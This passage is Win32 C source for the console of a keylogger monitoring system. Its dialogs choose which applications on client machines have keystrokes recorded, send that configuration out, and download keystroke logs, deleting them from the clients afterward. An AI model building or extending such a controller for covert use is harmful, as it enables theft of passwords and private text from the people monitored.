                PrintToStatusWindow(L"Unable to set dialog box position");
                return FALSE;
            }

            hKLMRetDlg = hDlg;

            return TRUE;
        }


        case WM_CTLCOLORDLG:	// fall-through

        case WM_CTLCOLORSTATIC:
        {
            HDC hdcStatic = (HDC)wParam;
            hbrBackground = CreateSolidBrush(RGB(255, 255, 255));
            SetTextColor(hdcStatic, RGB(0, 0, 0));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LONG)hbrBackground;
        }

        case WM_CLIENT_RESPONSE:
        {
            // get the SGFILEDATA from the PDATA
            PDATA *pPData = NULL;

            pPData = (PDATA*)lParam;

            if ((hFTThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTGetLogFiles,
                (LPVOID)&pPData->PDataType.KLFileTransfer, 0, NULL)) == NULL) {
                // display error
                return FALSE;
            }

            return TRUE;
        }


        case WM_COMMAND:
        {
            switch (LOWORD(wParam)) {
                case IDB_KLM_RET_GETFILES:
                {
                    BOOL fInvalidFromDate = FALSE;
                    BOOL fInvalidToDate = FALSE;

                    if ((iRetVal = DateTime_GetSystemtime(GetDlgItem(hDlg, IDC_KLM_RET_FROMDATE),
                        &stFromDate)) != GDT_VALID) {
                        MessageBox(hDlg, L"Error reading From date", 0, 0);
                        return TRUE;
                    }

                    if ((iRetVal = DateTime_GetSystemtime(GetDlgItem(hDlg, IDC_KLM_RET_TODATE),
                        &stToDate)) != GDT_VALID) {
                        MessageBox(hDlg, L"Error reading To date", 0, 0);
                        return TRUE;
                    }

                    GetLocalTime(&stToday);

                    // validate the dates

                    // Check if ToDate is >= Today's Date.
                    if (stToDate.wYear > stToday.wYear) {
                        fInvalidToDate = TRUE;
                    } else if (stToDate.wYear == stToday.wYear) {
                        if (stToDate.wMonth > stToday.wMonth) {
                            fInvalidToDate = TRUE;
                        } else if (stToDate.wMonth == stToday.wMonth) {
                            if (stToDate.wDay >= stToday.wDay) {
                                fInvalidToDate = TRUE;
                            }
                        }
                    }
                    if (fInvalidToDate == TRUE) {
                        MessageBox(hDlg, L"To Date is greater than or equal to Current Date. Note that today's log file cannot be retrieved.",
                            L"Invalid Date", MB_ICONINFORMATION);
                        return TRUE;
                    }

                    // check if FromDate is >= ToDate
                    if (stFromDate.wYear > stToDate.wYear) {
                        fInvalidFromDate = TRUE;
                    } else if (stFromDate.wYear == stToDate.wYear) {
                        if (stFromDate.wMonth > stToDate.wMonth) {
                            fInvalidFromDate = TRUE;
                        } else if (stFromDate.wMonth == stToDate.wMonth) {
                            if (stFromDate.wDay > stToDate.wDay)
                                fInvalidFromDate = TRUE;
                        }
                    }
                    if (fInvalidFromDate == TRUE) {
                        MessageBox(hDlg, L"From Date is greater than or equal to To Date", L"Invalid Date", MB_ICONINFORMATION);
                        return TRUE;
                    }


                    // once validated, fill the KLMData structure with relevant command and data.
                    MNTRDataOut.KLMData.cmd = KLIF_GET_LOGFILES;
                    memcpy(&MNTRDataOut.KLMData.stFromDate, &stFromDate, sizeof(stFromDate));
                    memcpy(&MNTRDataOut.KLMData.stToDate, &stToDate, sizeof(stToDate));

                    __try {
                        if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
                            MessageBox(hDlg, L"KLM: malloc() error", 0, 0);
                            __leave;
                        }

                        // fill the pSPMArgs() structure and call ServerPluginManager()
                        memset(pSPMArgs, 0, sizeof(*pSPMArgs));
                        pSPMArgs->cmd = SPM_SENDDATA;
                        pSPMArgs->iFromPlugin = KEYLOGGER;
                        memcpy(&pSPMArgs->MNTRData, &MNTRDataOut, sizeof(MNTRDATA));

                        iRetVal = ServerPluginManager(NULL, pSPMArgs, NULL);
                    }
                    __finally {
                        if (pSPMArgs)
                            free(pSPMArgs);
                    }

                }// case IDB_KLM_RET_GETFILES:
                return TRUE;


                case IDB_KLM_RET_STOP:
                {
                    return TRUE;
                }

            }// switch(LOWORD(wParam))
            return FALSE;
        }

    }// switch(message)
    return FALSE;

}

BOOL CALLBACK KLMonConfigDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {

    HBRUSH hbrBackground;

    int	i, iRetVal;

    WCHAR *pwsz = NULL;

    WORD	wLen;
    WCHAR	wszRTInt[16];
    WCHAR	wszOffInt[16];
    WCHAR	wszEXEName[MAX_FILE_NAME + 1];

    static HWND hList;
    LVCOLUMN	lvColumn = { 0 };
    LVITEM		lviToInsert = { 0 };

    // config structures
    KLCONFIG KLConfig = { 0 };

    // 
    SPMARGS	*pSPMArgs = NULL;

    __try {
        if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
            PrintToStatusWindow(L"KLM: malloc error: SPMArgs");
            return FALSE;
        }

        switch (message) {
            case WM_INITDIALOG:
            {
                RECT rcTab = { 0,0,0,0 };

                // get the pointer to the DLGHDR structure from the parent window
                HWND hParentDlg = GetParent(hDlg);
                DLGHDR *pDlgHdr = (DLGHDR*)GetWindowLong(hParentDlg, GWL_USERDATA);

                // get the bounding rectangle of the client area of the tab control
                GetClientRect(pDlgHdr->hTab, &rcTab);

                // set the dialog box position to fit inside the tab control
                if ((iRetVal = SetWindowPos(hDlg, NULL, rcTab.left + 15, rcTab.top + 35,
                    0, 0, SWP_NOZORDER | SWP_NOSIZE)) == 0) {
                    iRetVal = GetLastError();
                    PrintToStatusWindow(L"Unable to set dialog box position");
                    return FALSE;
                }

                if ((hList = GetDlgItem(hDlg, IDC_KLM_CONFIG_APP_LIST)) == NULL) {
                    // error
                }


                // Set up list view headers
                lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;

                // first column
                lvColumn.pszText = TEXT("Application Name");
                lvColumn.cx = 0x100;
                SendMessage(hList, LVM_INSERTCOLUMN, 0, (LPARAM)&lvColumn);

                if (UpdateKLConfigUI(hDlg) == FALSE)
                    MessageBox(hDlg, L"Error updating UI", L"Update UI", MB_ICONINFORMATION);

                return TRUE;
            }

            case WM_CTLCOLORDLG:	// fall-through

            case WM_CTLCOLORSTATIC:
            {
                HDC hdcStatic = (HDC)wParam;
                hbrBackground = CreateSolidBrush(RGB(255, 255, 255));
                SetTextColor(hdcStatic, RGB(0, 0, 0));
                SetBkMode(hdcStatic, TRANSPARENT);
                return (LONG)hbrBackground;
            }


            case WM_COMMAND:
            {
                switch (LOWORD(wParam)) {
                    case IDB_KLM_CONFIG_ADD:
                    {
                        // retrieve exe name and validate

                        // get number of characters
                        wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_ADD_APP, EM_LINELENGTH, 0, 0);
                        if (wLen > MAX_FILE_NAME) {
                            MessageBox(hDlg, L"Application name too long.", L"Add Application", MB_ICONEXCLAMATION);
                            return TRUE;
                        } else if (wLen == 0) {
                            MessageBox(hDlg, L"Please enter the application name", L"Add Application", MB_ICONEXCLAMATION);
                            return TRUE;
                        }

                        // Put the number of characters into first word of buffer. 
                        *((LPWORD)wszEXEName) = wLen;

                        // Get the characters. 
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_ADD_APP, EM_GETLINE,
                            (WPARAM)0,       // line 0 
                            (LPARAM)wszEXEName);

                        // Null-terminate the string.
                        wszEXEName[wLen] = 0;

                        pwsz = wcsstr(wszEXEName, L".exe");
                        if (pwsz == NULL) {
                            MessageBox(hDlg, L"Invalid Application Name", L"Add Application", MB_ICONEXCLAMATION);
                            return TRUE;
                        }

                        // retrieve RTinterval and Offline interval
                        // get number of characters
                        wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_OFF_INT, EM_LINELENGTH, 0, 0);

                        // Put the number of characters into first word of buffer. 
                        *((LPWORD)wszOffInt) = wLen;

                        // Get the characters. 
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_OFF_INT, EM_GETLINE,
                            (WPARAM)0,       // line 0 
                            (LPARAM)wszOffInt);

                        // Null-terminate the string.
                        wszOffInt[wLen] = 0;

                        // get number of characters
                        wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_RT_INT, EM_LINELENGTH, 0, 0);

                        // Put the number of characters into first word of buffer. 
                        *((LPWORD)wszRTInt) = wLen;

                        // Get the characters. 
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_RT_INT, EM_GETLINE,
                            (WPARAM)0,       // line 0 
                            (LPARAM)wszRTInt);

                        // Null-terminate the string.
                        wszRTInt[wLen] = 0;

                        // read config file and get current config
                        if (ReadKLConfigFile(&KLConfig) == FALSE) {
                            MessageBox(hDlg, L"Error reading configuration file", L"Error", MB_ICONERROR);
                            return TRUE;
                        }

                        // check for duplicate items
                        for (i = 0; i < KLConfig.nApps; ++i) {
                            if (wcscmp(KLConfig.AppList[i], wszEXEName) == 0) {
                                MessageBox(hDlg, L"Application already exists.", L"Add Application",
                                    MB_ICONEXCLAMATION | MB_OK);
                                return TRUE;
                            }
                        }

                        // update the values in the structure
                        KLConfig.nApps += 1;
                        KLConfig.ulOffInterval = (unsigned long)CHANGE_TO_MS_FROM_MIN(_wtoi(wszOffInt));
                        KLConfig.ulRTInterval = (unsigned long)CHANGE_TO_MS_FROM_SEC(_wtoi(wszRTInt));
                        if (wcscpy_s(KLConfig.AppList[KLConfig.nApps - 1],
                            MAX_FILE_NAME + 1, wszEXEName) != 0) {
                            // error
                        }

                        // write the changed config to file
                        if ((iRetVal = WriteKLConfigFile(&KLConfig)) == FALSE) {
                            MessageBox(hDlg, L"Error writing configuration file", L"Error", MB_ICONERROR);
                            return TRUE;
                        }

                        if (UpdateKLConfigUI(hDlg) == FALSE)
                            MessageBox(hDlg, L"Error updating UI", L"Update UI", MB_ICONINFORMATION);

                        // clear the application name edit box
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_ADD_APP, EM_SETSEL, 0, -1);
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_ADD_APP, EM_REPLACESEL, FALSE, (LPARAM)(LPWSTR)L"");

                        return TRUE;
                    }


                    case IDB_KLM_CONFIG_UREMOTE:
                    {
                        // read config
                        if (ReadKLConfigFile(&KLConfig) == FALSE) {
                            MessageBox(hDlg, L"Error reading configuration file", L"Error", MB_ICONERROR);
                            return TRUE;
                        }

                        // retrieve RTinterval and Offline interval
                        // get number of characters
                        wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_OFF_INT, EM_LINELENGTH, 0, 0);

                        // Put the number of characters into first word of buffer. 
                        *((LPWORD)wszOffInt) = wLen;

                        // Get the characters. 
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_OFF_INT, EM_GETLINE, (WPARAM)0, (LPARAM)wszOffInt);

                        // Null-terminate the string.
                        wszOffInt[wLen] = 0;

                        // get number of characters
                        wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_RT_INT, EM_LINELENGTH, 0, 0);

                        // Put the number of characters into first word of buffer. 
                        *((LPWORD)wszRTInt) = wLen;

                        // Get the characters. 
                        SendDlgItemMessage(hDlg, IDC_KLM_CONFIG_RT_INT, EM_GETLINE, (WPARAM)0, (LPARAM)wszRTInt);

                        // Null-terminate the string.
                        wszRTInt[wLen] = 0;

                        // update the interval values
                        KLConfig.ulOffInterval = CHANGE_TO_MS_FROM_MIN(_wtoi(wszOffInt));
                        KLConfig.ulRTInterval = CHANGE_TO_MS_FROM_SEC(_wtoi(wszRTInt));

                        // write the updated config to file
                        if (WriteKLConfigFile(&KLConfig) == FALSE) {
                            MessageBox(hDlg, L"Error reading configuration file", L"Error", MB_ICONERROR);
                            return TRUE;
                        }

                        pSPMArgs->cmd = SPM_SENDDATA;
                        pSPMArgs->iFromPlugin = KEYLOGGER;
                        pSPMArgs->MNTRData.KLMData.cmd = KLIF_UPDATE_CONFIG;
                        memcpy(&pSPMArgs->MNTRData.KLMData.KLConfig, &KLConfig, sizeof(KLCONFIG));

                        if ((iRetVal = ServerPluginManager(0, pSPMArgs, NULL)) == FALSE)
                            PrintToStatusWindow(L"KLM: Update config data not sent");
                        else
                            PrintToStatusWindow(L"KLM: Update config data sent");

                        return TRUE;
                    }

                }// switch(LOWORD(wParam))
                return FALSE;
            }

            case WM_NOTIFY:
            {
                switch (((LPNMHDR)lParam)->code) {
                    case NM_RCLICK:
                    {
                        int iSelectedItem = -1;
                        int iSelectedSubItem = 0;

                        WCHAR wszWarningMsg[MAX_SW_MSG + 1] = L"";
                        WCHAR wszSelectedItemText[MAX_PATH + 1] = L"";
                        WCHAR *pwsz = NULL;

                        LVITEM lviSelectedItem = { 0 };

                        // check whether the click was inside the list view
                        if (((LPNMHDR)lParam)->hwndFrom == hList) {
                            iSelectedItem = ((LPNMITEMACTIVATE)lParam)->iItem;
                            iSelectedSubItem = ((LPNMITEMACTIVATE)lParam)->iSubItem;

                            // get the text of the clicked item
                            if (iSelectedItem != -1) {
                                lviSelectedItem.mask = LVIF_TEXT;
                                lviSelectedItem.iItem = iSelectedItem;
                                lviSelectedItem.pszText = wszSelectedItemText;
                                lviSelectedItem.cchTextMax = MAX_PATH + 1;

                                if (SendMessage(hList, LVM_GETITEM, 0,
                                    (LPARAM)&lviSelectedItem) == FALSE) {
                                    MessageBox(hDlg, L"Unable to retrieve click information", L"Error", 0);
                                }

                                // drop down menu display
                                ShowRightClickMenu(hList);

                                wsprintf(wszWarningMsg, L"Are you sure you want to remove %s?", wszSelectedItemText);
                                iRetVal = MessageBox(hDlg, wszWarningMsg, L"Confirm Application Removal", MB_YESNO);
                                if (iRetVal == IDYES) {
                                    // read config file
                                    if (ReadKLConfigFile(&KLConfig) == FALSE) {
                                        MessageBox(hDlg, L"Error reading configuration file", L"KLM Configuration", MB_ICONEXCLAMATION);
                                        return TRUE;
                                    }

                                    // update config structure

                                    // search for the entry with the selected application exe name
                                    for (i = 0; i < KLConfig.nApps; ++i) {
                                        if ((pwsz = wcsstr(KLConfig.AppList[i], wszSelectedItemText)) == NULL)
                                            continue;

                                        // delete the entry
                                        memset(&KLConfig.AppList[i], 0, sizeof(KLConfig.AppList[i]));

                                        // shift the last entry to the deleted position
                                        memcpy(&KLConfig.AppList[i], &KLConfig.AppList[KLConfig.nApps - 1],
                                            sizeof(KLConfig.AppList[i]));

                                        // delete the last entry
                                        memset(&KLConfig.AppList[KLConfig.nApps - 1], 0, sizeof(KLConfig.AppList[0]));

                                        --KLConfig.nApps;

                                        // write config file
                                        if (WriteKLConfigFile(&KLConfig) == FALSE) {
                                            MessageBox(hDlg, L"Error reading configuration file", L"KLM Configuration", MB_ICONEXCLAMATION);
                                            return TRUE;
                                        } else {
                                            if (UpdateKLConfigUI(hDlg) == FALSE)
                                                MessageBox(hDlg, L"Error updating UI", L"KLM Configuration", MB_ICONINFORMATION);
                                        }
                                        break;

                                    }// for i

                                }// ID_YES
                            }
                        }// if( ((LPNMHDR)lParam)->hwndFrom == hList )
                        return 0;
                    }
                }// switch (((LPNMHDR)lParam)->code)
                return FALSE;
            }



        }// switch(message)
        return FALSE;
    }
    __finally {
        if (pSPMArgs)
            free(pSPMArgs);
    }
}

BOOL ReadKLConfigFile(KLCONFIG *pKLConfig) {
    extern WCHAR g_wszCurCliIP[];

    int		iConfigFile = 0;
    int		iRetVal;
    WCHAR	wszConfigFilePath[MAX_PATH + 1];

    // path
    wsprintf(wszConfigFilePath, L"%s\\%s\\%s", FP_CLIENTS_DIR, g_wszCurCliIP, FP_CLIENT_KLM_CONF);

    // open the file
    if ((iRetVal = _wsopen_s(&iConfigFile, wszConfigFilePath, _O_RDONLY | _O_BINARY,
        _SH_DENYWR, _S_IREAD | _S_IWRITE)) != 0) {
        iRetVal = GetLastError();
        if (iRetVal == ERROR_PATH_NOT_FOUND)
            return FALSE;

        if (iRetVal == ERROR_FILE_NOT_FOUND) {
            // create the file
            if ((iRetVal = _wsopen_s(&iConfigFile, wszConfigFilePath, _O_WRONLY | _O_CREAT | _O_BINARY,
                _SH_DENYRW, _S_IREAD | _S_IWRITE)) != 0) {
                return FALSE;
            }
            _close(iConfigFile);
            iConfigFile = 0;
        } else
            return FALSE;
    }

    if (iConfigFile != 0) {
        // read current offline config from file
        if ((iRetVal = _read(iConfigFile, pKLConfig, sizeof(KLCONFIG))) <= 0) {
            iRetVal = GetLastError();
            if (iConfigFile) {
                _close(iConfigFile);
                iConfigFile = 0;
            }
            if (iRetVal == 0)
                return TRUE;
            else
                return FALSE;
        }

        // close the file
        _close(iConfigFile);
        iConfigFile = 0;
    }
    return TRUE;
}

BOOL WriteKLConfigFile(const KLCONFIG *pKLConfig) {
    extern WCHAR g_wszCurCliIP[];

    int		iConfigFile = 0;
    int		iRetVal;
    WCHAR	wszConfigFilePath[MAX_PATH + 1];

    // path
    wsprintf(wszConfigFilePath, L"%s\\%s\\%s", FP_CLIENTS_DIR, g_wszCurCliIP, FP_CLIENT_KLM_CONF);

    // open and truncate the file
    if ((iRetVal = _wsopen_s(&iConfigFile, wszConfigFilePath, _O_WRONLY | _O_TRUNC | _O_BINARY,
        _SH_DENYRW, _S_IREAD | _S_IWRITE)) != 0) {
        iRetVal = GetLastError();
        if (GetLastError() == ERROR_PATH_NOT_FOUND) {
            // create the file
            if ((iRetVal = _wsopen_s(&iConfigFile, wszConfigFilePath, _O_WRONLY | _O_CREAT | _O_BINARY,
                _SH_DENYRW, _S_IREAD | _S_IWRITE)) != 0) {
                return FALSE;
            }
            _close(iConfigFile);
            iConfigFile = 0;
        } else {
            return FALSE;
        }
    }

    // write offline config structure
    if (iConfigFile != 0) {
        if ((iRetVal = _write(iConfigFile, pKLConfig, sizeof(KLCONFIG))) == -1) {
            if (iConfigFile) {
                _close(iConfigFile);
                iConfigFile = 0;
            }
            return FALSE;
        }

        // close the file
        if (iConfigFile) {
            _close(iConfigFile);
            iConfigFile = 0;
        }
    }
    return TRUE;
}


DWORD WINAPI FTGetLogFiles(LPVOID lpArgs) {
    extern WCHAR g_wszCurCliIP[];
    extern WCHAR g_wszCurCliDIR[];

    DWORD dwEventRetVal;
    int i, iRetVal, nFiles;

    HWND hPMsg = NULL;
    HWND hProgressBar = NULL;
    HANDLE hFTCompleteEvent = NULL;

    FILE_TRANSFER_DATA *pKLFileTransfer = NULL;

    WCHAR wszDestPath[MAX_PATH + 1];
    WCHAR wszPMsg[MAX_PROGRESS_MSG + 1];
    WCHAR wszSWMsg[MAX_SW_MSG + 1] = L"";
    WCHAR wszCurWorkDir[MAX_PATH + 1] = L"";
    WCHAR wszLogFileMsg[MAX_LOGFILE_LINE + 1] = L"";
    WCHAR *pwszPrevToken = NULL, *pwszCurToken = NULL;

    pKLFileTransfer = (FILE_TRANSFER_DATA*)lpArgs;

    nFiles = pKLFileTransfer->nFiles;

    if (nFiles == 0) {
        MessageBox(hKLMRetDlg, L"No files to download", L"Get Snapshots", MB_ICONINFORMATION | MB_OK);
        return 0;
    }

    if (GetCurrentWorkDir(wszCurWorkDir) == FALSE) {
        PrintToStatusWindow(L"Unable to retrieve current working directory.");
        return FALSE;
    }

    // disable the Get Files button
    EnableWindow(GetDlgItem(hKLMRetDlg, IDB_KLM_RET_GETFILES), FALSE);

    // enable Stop button
    EnableWindow(GetDlgItem(hKLMRetDlg, IDB_KLM_RET_STOP), TRUE);

    // create an event which will be used to get notification of file transfer completion
    hFTCompleteEvent = CreateEvent(NULL,	// default security attributes
        TRUE,	// manual reset using ResetEvent()
        FALSE,	// non-signaled initial state
        EVENT_FT_COMPLETE);	// name of the event object

    if (hFTCompleteEvent == NULL) {
        iRetVal = GetLastError();
        return FALSE;
    }

    // handle of the static text above the progress bar
    if ((hPMsg = GetDlgItem(hKLMRetDlg, IDC_KLM_RET_STATIC)) == NULL) {
        iRetVal = GetLastError();
    }
    ShowWindow(hPMsg, SW_SHOW);

    // progress bar control
    if ((hProgressBar = GetDlgItem(hKLMRetDlg, IDC_KLM_RET_PROGRESS)) == NULL) {
        iRetVal = GetLastError();
    }

    // set the range
    iRetVal = SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, nFiles));

    // set the step
    iRetVal = SendMessage(hProgressBar, PBM_SETSTEP, 1, NULL);

    // set the initial value
    iRetVal = SendMessage(hProgressBar, PBM_SETPOS, 0, NULL);

    // set fFTDeleteFile to delete the log file on the client machine after successful download
    fFTDeleteFile = TRUE;

    // construct absolute path for destination and call GetFile()
    for (i = 0; i < nFiles; ++i) {
        // get the current file's file name from the absolute path.
        pwszPrevToken = pKLFileTransfer->ListOfFiles[i].wszFileName;
        while ((pwszCurToken = wcsstr(pwszPrevToken, L"\\")) != NULL) {
            pwszPrevToken = pwszCurToken;

            //skip over '\'
            ++pwszPrevToken;
        }

        // show status in static text
        swprintf_s(wszPMsg, MAX_PROGRESS_MSG + 1, L"Downloading: %s...", pwszPrevToken);
        SetWindowText(hPMsg, wszPMsg);

        // construct the absolute path for the destination file (local path)
        swprintf_s(wszDestPath, MAX_PATH + 1, L"%s\\%s\\%s\\%s", wszCurWorkDir, g_wszCurCliDIR,
            FP_CLIENT_LOGFILES_DIR, pwszPrevToken);

        if ((iRetVal = GetFile(pKLFileTransfer->ListOfFiles[i].wszFileName, wszDestPath)) == FALSE) {
            swprintf_s(wszSWMsg, MAX_SW_MSG + 1, L"Unable to retrieve file: %s", pwszPrevToken);
            MessageBox(hKLMRetDlg, wszSWMsg, L"Retrieve Files", MB_ICONINFORMATION);
        }
        // wait for notification that the file has been downloaded
        dwEventRetVal = WaitForSingleObject(hFTCompleteEvent, INFINITE);
        if (dwEventRetVal == WAIT_OBJECT_0)
            ResetEvent(hFTCompleteEvent);

        if (fFTSuccess == FALSE) {
            swprintf_s(wszSWMsg, MAX_SW_MSG + 1,
                L"There was an error while downloading %s. See the log file for more details.", pwszPrevToken);
            MessageBox(hKLMRetDlg, wszSWMsg, L"Retrieve Files", MB_ICONINFORMATION);

            switch (iFTStatus) {
                case FT_ERROR_FILE_CORRUPTED:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s. File Corrupted.", pwszPrevToken);
                    break;
                }

                case FT_ERROR_CONN_CLOSED:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s. Connection closed.", pwszPrevToken);
                    break;
                }

                case FT_ERROR_FNF:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s. File not found not client machine.", pwszPrevToken);
                    break;
                }

                case FT_ERROR_OPEN_DEST_FILE:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s. Open failed.", pwszPrevToken);
                    break;
                }

                case FT_ERROR_WRITE_TO_FILE:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s. Write failed.", pwszPrevToken);
                    break;
                }

                default:
                {
                    swprintf_s(wszLogFileMsg, MAX_LOGFILE_LINE + 1, L"Error downloading file: %s", pwszPrevToken);
                    break;
                }
            }

            WriteToLogFile(FP_SERVER_LOGFILE, L"KeylogMonDP", L"FTGetLogFiles", wszLogFileMsg, 0);
        }

        // update progress bar
        iRetVal = SendMessage(hProgressBar, PBM_STEPIT, 0, 0);

        // continue to next file in the list

    }// for

    // show status in static text
    swprintf_s(wszPMsg, MAX_PROGRESS_MSG + 1, L"All Files Download Complete");
    SetWindowText(hPMsg, wszPMsg);

    Sleep(2000);

    // hide the static text and clear the progress bar
    ShowWindow(hPMsg, SW_HIDE);
    iRetVal = SendMessage(hProgressBar, PBM_SETPOS, 0, NULL);

    // Re-enable the Get Files button
    EnableWindow(GetDlgItem(hKLMRetDlg, IDB_KLM_RET_GETFILES), TRUE);

    // disable Stop button
    EnableWindow(GetDlgItem(hKLMRetDlg, IDB_KLM_RET_STOP), FALSE);

    return TRUE;
}

// FindSearchStr()
// iMatchField: Which field to match? Class name/Window title/KeysPressed.
HTREEITEM FindSearchStr(const HWND hTree, const HTREEITEM hFromNode, const WCHAR *wszSearchStr, HTREEITEM *phFound/*, int iMatchField*/) {
    HTREEITEM hNextNode = NULL;
    static TVITEM tviItem = { 0 };
    static KLHANDLENODE *pKLHandleNode = NULL;

    static BOOL fFound = FALSE;

    if (hFromNode == NULL)
        return NULL;
    else {
        // try for a match in the current node
        tviItem.mask = TVIF_HANDLE | TVIF_PARAM;
        tviItem.hItem = hFromNode;
        if (SendMessage(hTree, TVM_GETITEM, 0, (LPARAM)&tviItem) == FALSE) {
            // error
            return NULL;
        }

        // determine the type of the node (process node/time node/handle node)
        if (TreeView_GetParent(hTree, hFromNode) == NULL) {
            // it is a process node

            // goto child
            if ((hNextNode = TreeView_GetChild(hTree, hFromNode)) != NULL)
                FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

            // goto sibling if no child exists
            if ((hNextNode = TreeView_GetNextSibling(hTree, hFromNode)) != NULL)
                FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

            else
                return NULL;
        } else if (TreeView_GetParent(hTree, TreeView_GetParent(hTree, hFromNode)) == NULL) {
            // it is a time node

            // goto child
            if ((hNextNode = TreeView_GetChild(hTree, hFromNode)) != NULL)
                FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

            // goto sibling if no child exists
            if ((hNextNode = TreeView_GetNextSibling(hTree, hFromNode)) != NULL)
                FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

            return NULL;
        } else {
            // it is a handle node
            if ((pKLHandleNode = (KLHANDLENODE*)tviItem.lParam) == NULL) {
                // display error in the edit boxes
                return NULL;
            }

            if (wcsstr(pKLHandleNode->wszKeys, wszSearchStr)) {
                fFound = TRUE;
                *phFound = hFromNode;

                // reset variables
                hNextNode = NULL;
                memset(&tviItem, 0, sizeof(TVITEM));
                pKLHandleNode = NULL;

                longjmp(jbFindNext, 1);
            } else {
                // goto child
                if ((hNextNode = TreeView_GetChild(hTree, hFromNode)) != NULL)
                    FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

                // goto sibling if no child exists
                if (fFound == FALSE) {
                    // goto sibling if no child exists
                    if ((hNextNode = TreeView_GetNextSibling(hTree, hFromNode)) != NULL)
                        FindSearchStr(hTree, hNextNode, wszSearchStr, phFound);

                }

                return NULL;
            }
        }
    }

    return NULL;
}

// 
// --
BOOL KLMRetShowLogFileList(HWND hComboBox) {
    extern  WCHAR g_wszCurCliIP[];

    int	i, iRetVal, nFiles;
    FILELIST flFileList[MAX_FILES];
    WCHAR wszLogFilesPath[MAX_PATH + 1];

    // construct the path of the log files
    swprintf_s(wszLogFilesPath, MAX_PATH + 1, L"%s\\%s", g_wszCurCliDIR, FP_CLIENT_LOGFILES_DIR);

    // Retrieve the log files list
    nFiles = ListDir(wszLogFilesPath, L"*.log", flFileList, MAX_FILES);

    // clear the combo box
    SendMessage(hComboBox, CB_RESETCONTENT, 0, 0);	// always returns CB_OKAY

    if (nFiles > 0) {
        // fill the combo box with the list of available log files
        for (i = 0; i < nFiles; ++i) {
            iRetVal = SendMessage(hComboBox, CB_ADDSTRING, 0, (LPARAM)flFileList[i].wszFileName);
            if (iRetVal == CB_ERR || iRetVal == CB_ERRSPACE) {
                // error
            }
        }
    }

    return TRUE;
}

BOOL UpdateKLConfigUI(HWND hDlg) {
    int i, iRetVal;
    int iOffInt = 0;
    int iRTInt = 0;

    KLCONFIG KLConfig = { 0 };

    HWND	hList = NULL;
    LVITEM	lviToInsert = { 0 };

    WCHAR wszRTInt[16];
    WCHAR wszOffInt[16];

    // get handle to list view
    if ((hList = GetDlgItem(hDlg, IDC_KLM_CONFIG_APP_LIST)) == NULL)
        return FALSE;

    // read from file
    if (ReadKLConfigFile(&KLConfig) == FALSE)
        return FALSE;

    // Intervals
    iOffInt = (int)CHANGE_TO_MIN_FROM_MS(KLConfig.ulOffInterval);
    iRTInt = (int)CHANGE_TO_SEC_FROM_MS(KLConfig.ulRTInterval);

    wsprintf(wszOffInt, L"%d", iOffInt);
    wsprintf(wszRTInt, L"%d", iRTInt);
    SetWindowText(GetDlgItem(hDlg, IDC_KLM_CONFIG_OFF_INT), wszOffInt);
    SetWindowText(GetDlgItem(hDlg, IDC_KLM_CONFIG_RT_INT), wszRTInt);

    ListView_DeleteAllItems(hList);

    lviToInsert.mask = LVIF_TEXT;

    // Application List
    for (i = 0; i < KLConfig.nApps; ++i) {
        lviToInsert.iItem = i;
        lviToInsert.iSubItem = 0;
        lviToInsert.pszText = KLConfig.AppList[i];
        iRetVal = SendMessage(hList, LVM_INSERTITEM, 0, (LPARAM)&lviToInsert);	// -1 indicated failure

    }// for i

    return TRUE;
}